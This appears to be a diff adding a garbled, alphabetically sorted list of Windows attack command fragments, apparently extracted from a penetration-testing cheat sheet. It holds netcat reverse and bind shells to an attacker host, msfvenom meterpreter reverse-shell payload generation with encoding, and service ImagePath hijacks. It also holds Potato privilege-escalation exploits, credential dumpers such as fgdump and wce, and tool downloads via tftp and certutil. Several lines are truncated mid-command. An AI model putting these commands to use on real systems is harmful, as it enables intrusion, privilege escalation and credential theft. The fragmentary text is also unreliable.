@@ -1,0 +1,47 @@
+ -nv <attackerip> <attacker port> -e C:\WINDOWS\System32\cmd.exe
+ <attackerip> <attackerport> -e C:\windows\system32\cmd.exe
+ is needed (https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
+"# For XP SP0,  version 5.2 of accesschk.exe"
+"LM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /t REG_EXPAND_SZ /v ImagePath /d ""C:\temp\evil.exe"
+"Potato.exe -ip -cmd ""C:\\Windows\System32\cmd.exe"
+"reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath /d ""C:\temp\evil.exe"
+"sc config upnphost binpath= ""C:\Inetpub\nc.exe"
+# Upload nc.exe
+# first upload nc.exe
+# run an exploit on cmd.exe
+# upload accesschk.exe
+# upload nc.exe
+> execute -f rottenpotato.exe
+> get exploit.exe
+C:\Program Files\somepath\example.exe
+Potato.exe
+RemoteDLLInjector64.exe
+Start Notepad.exe
+Start powershell_ise.exe
+Start-Process -FilePath notepad.exe
+Start-Process c:\windows\system32\notepad.exe
+Start-Process notepad.exe
+Windows> tftp -i 192.168.30.45 GET nc.exe
+accesschk.exe
+certutil.exe -urlcache -split -f https://example.com/file.exe file.exe
+chimchurri.exe
+echo GET evil.exe
+fgdump.exe
+function notepad-bus{Start-Process -FilePath powershell_ise.exe
+i686-w64-mingw32-g++ exploit.cpp -o exploit.exe
+i686-w64-mingw32-gcc exploit.c -lws2_32 -o exploit.exe
+i686-w64-mingw32-gcc exploit.c -o exploit.exe
+i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
+icacls example.exe
+msfvenom -p windows/exec CMD='net localgroup administrators <username here> /add' -f exe > example.exe
+msfvenom -p windows/meterpreter/reverse_https LHOST= LPORT= -f exe -o evil.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -e x86/shikata_ga_nai -o evil.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o evil.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > example.exe
+nc -nlvp <port> -e cmd.exe
+nc -nv <IP> <port> -e cmd.exe
+powershell.exe
+psexec.exe -u <username> -p <password> \\MACHINENAME C:\Inetpub\nc.exe
+wce32.exe
+wce64.exe
+wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe
